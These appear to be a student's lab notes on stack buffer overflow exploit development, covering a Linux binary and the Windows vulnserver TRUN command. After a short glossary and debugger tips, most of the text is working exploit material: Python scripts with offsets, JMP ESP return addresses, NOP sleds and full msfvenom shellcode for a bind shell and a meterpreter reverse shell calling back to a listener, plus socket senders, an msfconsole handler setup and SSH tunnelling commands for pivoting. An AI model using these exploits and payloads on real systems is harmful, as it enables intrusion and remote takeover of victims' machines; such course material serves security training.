Exploit development is a potential phase or outcome of reverse engineering.
When performing exploit development, a cyber actor actively digs into a target object with the aim of understanding how it works better than its creators.
As the cyber actor gains more understanding of the object, they may find unintended functionality or vulnerabilities that the creators did not mitigate.
These unknown vulnerabilities are particularly dangerous as they can be actively exploited by attackers.
Alternatively, they can be mitigated by defendersif found before attackers exploit them.


HEAP
Memory that can be allocated and deallocated

STACK
A contiguous section of memory used for passing arguments

REGISTERS
Storage elements as close as possible to the central processing unit (CPU)

INSTRUCTION POINTER (IP)
a.k.a Program Counter (PC), contains the address of next instruction to be executed

STACK POINTER (SP)
Contains the address of the next available space on the stack

BASE POINTER (BP)
The base of the stack

FUNCTION
Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

SHELLCODE
The code that is executed once an exploit successfully takes advantage of a vulnerability. ( code that gives you a shell)

---------------------------------------------------
Buffer Overflow Defenses

Non executable (NX) stack
Address Space Layout Randomization (ASLR) ( default activated on everything ) 
Data Execution Prevention (DEP)
Stack Canaries
Position Independent Executable (PIE)


Technical Help
Utilizing tools such as:

IDA, GHIDRA
GDB, MONA, IMMUNITY
BASH, PYTHON



GDB Uses
Installation of Peda Plugin

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit


Common Commands

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point


------------------------------------------------------------------------------------------------------------------
EXPLOIT DEVELOPMENT 
DEMO 

./func 
chmod +x ./func

gdb func


----------------
to Check the pattern to FIND the IP in the buffer  and copy the pattern to the website 

run it in gdb peda then  copy the pattern from the website 

the <<<  used when it requires a user input when you dont require a user input but rather a parameter then you dont use the <<<
----------------------------------------------------------------------------------------------------------------------------------------------

step by step:
Run it to  see if you can overflow it/break it (dump it)

 disassemble the function ( main function )  to see the  the disassembled code 
 
  pdisass main
 
 pdisass ( the new function )
 
  pdisass getuserinput
  
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
get the Pattern
input the pattern in the Enter string field when ran on gdb peda 
 get the offset 
 (create the script and change the offset to the value )
 
offset = "A" * 62
eip = "B" * 4

print(offset + eip)

run <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)
( to check if you have  positive control  ) 

Next you wanna see if you can get control of the jump to the top of the stack
( you wanna see if there's a valid  one you can use ON THEIR MACHINES)

run gdb with no peda 
  env - gdb 
  file func 
  show env 
   unset env LINES
   unset env  COLUMNS
  run
   overflow  an make sure you get SIGSEGV
  info proc map ( shows mapped address spaces )
find /b  0xf7de1000, 0xf7ffe000, 0xff, 0xe4
(/b for binary) ( search between ( beginning of heap and  end of stack) (0xff, 0xe4 ( to find jump and esp))

grab few from the response to check for valdity /continue the process 
0xf7 f6 80 43
0xf7 f6 83 eb
0xf7 f6 86 3b
0xf7 f6 87 0b
0xf7f68733
0xf7f687bb
0xf7f68853
0xf7f6956b
0xf7f69633
0xf7f69a0b
0xf7f69c3b

( in the script create a new eip that goes  and checks it for the actual eip in the oppiste byte order )

0xf7 f6 80 43
 goes to 
"\x43\x80\xf6\xf7"

 (create a new  nop ) 
 nop = " \x90" * 10

 THIS GETS YoU TO THE TOP OF THE STACK 


now create a shellcode  using msfvenom 

msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python

 copy and paste from buf --to----buf  in your code block 


----
flight check list 
offset
eip 
nop 
buf
 in that order for it to print out 
 

Then RUN 
./func <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)
 sudo ./func <<< $(python /home/student/SEC/EXPDev/lin_exploit.py)


 if it doesnt work 
  change the nop sled to higher value 
  then  regenerate the shell code 
  if this doesnt work then change the eip 
  

---------------------------------------------------------------------------------------------------------------------------------
offset = "A" * 62
#eip = "B" * 4

'''
0xf7 f6 54 97
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7 f6 64 9b
0xf7 f6 65 33
0xf7 f6 66 33
0xf7 f6 6b 3b
'''
eip = "\x3b\x86\xf6\xf7"
nop = "\x90" * 10

buf =  b""
buf += b"\xdb\xc2\xbb\x1f\x72\x8f\x5f\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x0b\x31\x5a\x19\x03\x5a\x19\x83\xea\xfc\xfd"
buf += b"\x87\xe5\x54\x59\xf1\xa8\x0c\x31\x2c\x2e\x58\x26\x46"
buf += b"\x9f\x29\xc0\x97\xb7\xe2\x72\xf1\x29\x74\x91\x53\x5e"
buf += b"\x81\x55\x54\x9e\xf9\x3d\x3b\xff\x68\xd4\xc3\xa8\x21"
buf += b"\xaf\x25\x9b\x46"

print(offset + eip + nop + buf)
--------------------------------------------------------------------------------------------------------------------------------------
WINDOWS EXPLOIT DEVELOPMENT DEMO

 start by running the script - verify that it's running and listening 
 verfiy the port its listening on via netstat -anop 
 tasklist 
 nc <ip> port
 
 open secure server in immunity debugger 
  
  find the exact EIP offset 
  go to 
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
  generate about 5000 
  
   copy the pattern then  paste it into buf 
  
   run it and copy the EIP and paste to wiremask 
   
    get the offset 
    
     run it with the offset  and a new variable  to check for EIP 
     
     
#!/usr/bin/python

import socket
import os
import sys

host = "10.50.34.110"
port = 9999

buf = "TRUN /.:/"
buf += "A"*2003  # OFFSET
buf += "BBBB"   # EIP CHECK

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send(buf)
print s.recv(1024)
s.close()             

RUN the mona command to find the jump ESP 

!mona jmp -r esp -m "essfunc.dll"

 Get the thread to set your eip value 
 
 set your eip and no op 
 
 buf += "\xAF\x11\x50\x62"        # 625011AF   JMP ESP from essfunc.dll
buf += "\x90"*16                 # nopsled


FOR THE SHELL CODE PAYLOAD CHOOSE ONE 
-----------------------------------------------------------------------------------------------------------------
FIRST METHOD:

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xdb\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\xbb\x44\xdc\x09"
"\x7b\x31\x5a\x17\x83\xc2\x04\x03\x1e\xcf\xeb\x8e\x62\x07\x69"
"\x70\x9a\xd8\x0e\xf8\x7f\xe9\x0e\x9e\xf4\x5a\xbf\xd4\x58\x57"
"\x34\xb8\x48\xec\x38\x15\x7f\x45\xf6\x43\x4e\x56\xab\xb0\xd1"
"\xd4\xb6\xe4\x31\xe4\x78\xf9\x30\x21\x64\xf0\x60\xfa\xe2\xa7"
"\x94\x8f\xbf\x7b\x1f\xc3\x2e\xfc\xfc\x94\x51\x2d\x53\xae\x0b"
"\xed\x52\x63\x20\xa4\x4c\x60\x0d\x7e\xe7\x52\xf9\x81\x21\xab"
"\x02\x2d\x0c\x03\xf1\x2f\x49\xa4\xea\x45\xa3\xd6\x97\x5d\x70"
"\xa4\x43\xeb\x62\x0e\x07\x4b\x4e\xae\xc4\x0a\x05\xbc\xa1\x59"
"\x41\xa1\x34\x8d\xfa\xdd\xbd\x30\x2c\x54\x85\x16\xe8\x3c\x5d"
"\x36\xa9\x98\x30\x47\xa9\x42\xec\xed\xa2\x6f\xf9\x9f\xe9\xe7"
"\xce\xad\x11\xf8\x58\xa5\x62\xca\xc7\x1d\xec\x66\x8f\xbb\xeb"
"\x89\xba\x7c\x63\x74\x45\x7d\xaa\xb3\x11\x2d\xc4\x12\x1a\xa6"
"\x14\x9a\xcf\x53\x1c\x3d\xa0\x41\xe1\xfd\x10\xc6\x49\x96\x7a"
"\xc9\xb6\x86\x84\x03\xdf\x2f\x79\xac\xce\xf3\xf4\x4a\x9a\x1b"
"\x51\xc4\x32\xde\x86\xdd\xa5\x21\xed\x75\x41\x69\xe7\x42\x6e"
"\x6a\x2d\xe5\xf8\xe1\x22\x31\x19\xf6\x6e\x11\x4e\x61\xe4\xf0"
"\x3d\x13\xf9\xd8\xd5\xb0\x68\x87\x25\xbe\x90\x10\x72\x97\x67"
"\x69\x16\x05\xd1\xc3\x04\xd4\x87\x2c\x8c\x03\x74\xb2\x0d\xc1"
"\xc0\x90\x1d\x1f\xc8\x9c\x49\xcf\x9f\x4a\x27\xa9\x49\x3d\x91"
"\x63\x25\x97\x75\xf5\x05\x28\x03\xfa\x43\xde\xeb\x4b\x3a\xa7"
"\x14\x63\xaa\x2f\x6d\x99\x4a\xcf\xa4\x19\x6a\x32\x6c\x54\x03"
"\xeb\xe5\xd5\x4e\x0c\xd0\x1a\x77\x8f\xd0\xe2\x8c\x8f\x91\xe7"
"\xc9\x17\x4a\x9a\x42\xf2\x6c\x09\x62\xd7")


 run netstat -an to verify that it sets up a listening port on 4444 
 
 set up dynamic tunnels 
 
 
ssh student@10.50.40.200 -L 13061:192.168.28.120:4242
ssh student@127.0.0.1 -p 13061 -D 9050

 
 
 on your box run  proxychains nc -v 10.50.34.110 4444
 
 
------------------------------------------------------------------------------------------------------
SECOND METHOD: 
using nsfconsole 


Generate payload 

#### msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.254 lport=5555 -b '\x00' -f python #
##


 run nsfconsole and set these options 
 
(msfconsole )
> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 5555
lport => 5555


exploit 
Started reverse TCP handler on 0.0.0.0:5555 




#!/usr/bin/python

import socket

offset = "TRUN /.:/"
offset += "A"*2003  # OFFSET
eip = "\xa0\x12\x50\x62" # EIP 
noop = "\x90" * 10   # NOOP SLED 
eip = "\xa0\x12\x50\x62" # EIP 

#### msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.254 lport=5555 -b '\x00' -f python ###

buf =  b""
buf += b"\xba\xca\x06\x54\x5c\xd9\xe8\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x59\x31\x50\x14\x03\x50\x14\x83\xc0\x04\x28"
buf += b"\xf3\xa8\xb4\x23\xfc\x50\x45\x5b\xcc\x82\xcc\x7e\x4a"
buf += b"\xa8\x9d\xb0\x18\xfc\x2d\x3b\x4c\x15\x1f\xc4\x7e\xa2"
buf += b"\x15\x1c\x0a\xbe\x81\x51\xcc\x93\xee\xf0\xb0\xe9\x22"
buf += b"\xd2\x89\x21\x37\x13\xcd\xf7\x3d\xfc\x83\x8c\xec\x12"
buf += b"\xaf\xd1\x2c\x13\x7f\x82\xc7\x53\x07\xa8\x18\x27\xbb"
buf += b"\xb3\x48\x4c\x0b\xac\x38\xd9\xd4\xec\xb9\x0e\x61\x25"
buf += b"\xcd\x8c\x23\x87\xd1\x67\x87\x6c\x2c\xa1\xd9\xb2\xee"
buf += b"\x82\x17\x9f\xf0\xdb\x10\x3f\x87\x17\x63\xc2\x90\xec"
buf += b"\x19\x18\x14\xf2\xba\xeb\x8e\xd6\x3b\x3f\x48\x9d\x30"
buf += b"\xf4\x1e\xf9\x54\x0b\xf2\x72\x60\x80\xf5\x54\xe0\xd2"
buf += b"\xd1\x70\xa8\x81\x78\x21\x14\x67\x84\x31\xf0\xd8\x20"
buf += b"\x3a\x13\x0e\x54\xc3\xeb\x2f\x08\x53\x27\xe2\xb3\xa3"
buf += b"\x2f\x75\xc7\x91\xf0\x2d\x4f\x99\x79\xe8\x88\xa8\x6e"
buf += b"\x0b\x46\x12\xfe\xf5\x67\x62\xd6\x31\x33\x32\x40\x93"
buf += b"\x3c\xd9\x90\x1c\xe9\x77\x9b\x8a\x18\xb5\xb3\xb4\x75"
buf += b"\xbb\xc3\x5d\x35\x32\x25\x0d\x69\x14\xfa\xee\xd9\xd4"
buf += b"\xaa\x86\x33\xdb\x95\xb7\x3b\x36\xbe\x52\xd4\xee\x96"
buf += b"\xca\x4d\xab\x6d\x6a\x91\x66\x08\xac\x19\x82\xec\x63"
buf += b"\xea\xe7\xfe\x94\x8d\x07\xff\x64\x38\x07\x95\x60\xea"
buf += b"\x50\x01\x6b\xcb\x96\x8e\x94\x3e\xa5\xc9\x6b\xbf\x9f"
buf += b"\xa2\x5a\x55\x9f\xdc\xa2\xb9\x1f\x1d\xf5\xd3\x1f\x75"
buf += b"\xa1\x87\x4c\x60\xae\x1d\xe1\x39\x3b\x9e\x53\xed\xec"
buf += b"\xf6\x59\xc8\xdb\x58\xa2\x3f\x58\x9e\x5c\xbd\x77\x07"
buf += b"\x34\x3d\xc8\xb7\xc4\x57\xc8\xe7\xac\xac\xe7\x08\x1c"
buf += b"\x4c\x22\x41\x34\xc7\xa3\x23\xa5\xd8\xe9\xe2\x7b\xd8"
buf += b"\x1e\x3f\x8c\xa3\x6f\xc0\x6d\x54\x66\xa5\x6e\x54\x86"
buf += b"\xdb\x53\x82\xbf\xa9\x92\x16\x84\xa2\xa1\x3b\xad\x28"
buf += b"\xc9\x68\xad\x78"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.50.34.110', 9999))
print s.recv(1024)
print "[+] Sending exploit..."
s.send(offset + eip + noop  + buf)
s.close()


Gain meterpreter console on the msfconsole 

 run shell to gain shell access






-------------------------------MY VERSION----------------------------

https://captmeelo.com/exploitdev/2018/06/27/vulnserver-trun.html
https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b

Checklist 





------------------------------------------------------------------------------------------------------------

#!/usr/bin/python

import socket


badchar = "\x01"

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xfd\x12\x50\x62"
buf += "\x90" * 10
#BUFFER BEFORE THE SHELLCODE ___________________________________________________AYYYYYYYYYYYEE
buf += ("\xda\xc0\xd9\x74\x24\xf4\x58\x31\xc9\xbb\xdb\x43\xa8\x4c\xb1"
"\x53\x31\x58\x17\x83\xe8\xfc\x03\x83\x50\x4a\xb9\xcf\xbf\x08"
"\x42\x2f\x40\x6d\xca\xca\x71\xad\xa8\x9f\x22\x1d\xba\xcd\xce"
"\xd6\xee\xe5\x45\x9a\x26\x0a\xed\x11\x11\x25\xee\x0a\x61\x24"
"\x6c\x51\xb6\x86\x4d\x9a\xcb\xc7\x8a\xc7\x26\x95\x43\x83\x95"
"\x09\xe7\xd9\x25\xa2\xbb\xcc\x2d\x57\x0b\xee\x1c\xc6\x07\xa9"
"\xbe\xe9\xc4\xc1\xf6\xf1\x09\xef\x41\x8a\xfa\x9b\x53\x5a\x33"
"\x63\xff\xa3\xfb\x96\x01\xe4\x3c\x49\x74\x1c\x3f\xf4\x8f\xdb"
"\x3d\x22\x05\xff\xe6\xa1\xbd\xdb\x17\x65\x5b\xa8\x14\xc2\x2f"
"\xf6\x38\xd5\xfc\x8d\x45\x5e\x03\x41\xcc\x24\x20\x45\x94\xff"
"\x49\xdc\x70\x51\x75\x3e\xdb\x0e\xd3\x35\xf6\x5b\x6e\x14\x9f"
"\xa8\x43\xa6\x5f\xa7\xd4\xd5\x6d\x68\x4f\x71\xde\xe1\x49\x86"
"\x21\xd8\x2e\x18\xdc\xe3\x4e\x31\x1b\xb7\x1e\x29\x8a\xb8\xf4"
"\xa9\x33\x6d\x60\xa1\x92\xde\x97\x4c\x64\x8f\x17\xfe\x0d\xc5"
"\x97\x21\x2d\xe6\x7d\x4a\xc6\x1b\x7e\x65\x4b\x95\x98\xef\x63"
"\xf3\x33\x87\x41\x20\x8c\x30\xb9\x02\xa4\xd6\xf2\x44\x73\xd9"
"\x02\x43\xd3\x4d\x89\x80\xe7\x6c\x8e\x8c\x4f\xf9\x19\x5a\x1e"
"\x48\xbb\x5b\x0b\x3a\x58\xc9\xd0\xba\x17\xf2\x4e\xed\x70\xc4"
"\x86\x7b\x6d\x7f\x31\x99\x6c\x19\x7a\x19\xab\xda\x85\xa0\x3e"
"\x66\xa2\xb2\x86\x67\xee\xe6\x56\x3e\xb8\x50\x11\xe8\x0a\x0a"
"\xcb\x47\xc5\xda\x8a\xab\xd6\x9c\x92\xe1\xa0\x40\x22\x5c\xf5"
"\x7f\x8b\x08\xf1\xf8\xf1\xa8\xfe\xd3\xb1\xc9\x1c\xf1\xcf\x61"
"\xb9\x90\x6d\xec\x3a\x4f\xb1\x09\xb9\x65\x4a\xee\xa1\x0c\x4f"
"\xaa\x65\xfd\x3d\xa3\x03\x01\x91\xc4\x01")

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.150.245",9999))
print s.recv(1024)
print "[+] Sending exploit..."
s.send(buf)
s.close()
~        


-------------------------------------------------------------------------------------------------------------------------


